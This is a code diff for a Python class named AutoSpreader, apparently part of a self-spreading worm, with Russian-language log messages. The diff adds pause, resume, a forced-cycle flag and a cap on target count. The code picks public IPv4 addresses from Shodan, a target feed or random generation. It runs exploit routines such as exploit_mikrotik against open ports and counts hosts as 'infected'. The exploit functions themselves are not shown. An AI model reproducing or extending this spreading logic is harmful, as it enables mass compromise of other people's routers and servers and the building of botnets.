@@ -13,10 +13,13 @@ SCANNED_IPS_FILE = "scanned_ips.json"
 class AutoSpreader:
     def __init__(self, settings_file="avz_settings.json"):
         self.running = False
+        self.paused = False
+        self.force_cycle = False
         self.thread = None
         self.message_queue = queue.Queue()
         self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
         self.scanned_ips = set()
+        self.max_targets = 5000
         self.load_settings(settings_file)
         self.load_scanned_ips()
 
@@ -51,10 +54,18 @@ class AutoSpreader:
     def start(self):
         if self.running: return
         self.running = True
+        self.paused = False
+        self.force_cycle = False
         self.stats = {'scanned':0, 'infected':0, 'open_ports':0}
         self.thread = threading.Thread(target=self._worker, daemon=True)
         self.thread.start()
         self.message_queue.put("[System] INFECTION WAVE запущен")
+
+    def pause(self):
+        self.paused = True
+
+    def resume(self):
+        self.paused = False
 
     def stop(self):
         self.running = False
@@ -69,7 +80,6 @@ class AutoSpreader:
             return False
         self.stats['open_ports'] += 1
         self.message_queue.put(f"[Ports] {ip} открыты: {ports}")
-        # Порядок: самые надёжные векторы сначала
         if 8291 in ports and await exploit_mikrotik(ip):
             self.stats['infected'] += 1; return True
         if 80 in ports:
@@ -102,6 +112,9 @@ class AutoSpreader:
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         while self.running:
+            if self.paused:
+                time.sleep(1)
+                continue
             target_ips = []
             if self.shodan_api:
                 try:
@@ -114,22 +127,29 @@ class AutoSpreader:
                 except: pass
             if not target_ips:
                 public = loop.run_until_complete(fetch_targets())
-                for ip in public[:5000]:
+                for ip in public[:self.max_targets]:
                     if ip not in self.scanned_ips:
                         target_ips.append(ip)
                         self.scanned_ips.add(ip)
             if not target_ips:
-                for _ in range(500):
+                for _ in range(min(500, self.max_targets)):
                     ip = str(ipaddress.IPv4Address(random.randint(0x01000000, 0xDFFFFFFF)))
                     if ip not in self.scanned_ips:
                         target_ips.append(ip)
                         self.scanned_ips.add(ip)
+            if not target_ips:
+                time.sleep(self.interval)
+                continue
             self.stats['scanned'] += len(target_ips)
             self.message_queue.put(f"[Scan] {len(target_ips)} целей (всего просканировано: {self.stats['scanned']})")
             sem = asyncio.Semaphore(self.worker_threads)
             tasks = [self.attack_target(ip) for ip in target_ips]
             loop.run_until_complete(asyncio.gather(*tasks))
             self.message_queue.put(f"[Stats] Проверено: {self.stats['scanned']} | Заражено: {self.stats['infected']}")
+            # Автосохранение лога? Не здесь, но можно добавить событие
+            if self.force_cycle:
+                self.force_cycle = False
+                self.message_queue.put("[Auto] Принудительный цикл завершён")
             time.sleep(self.interval)
 
     def scan_once(self, target_list):
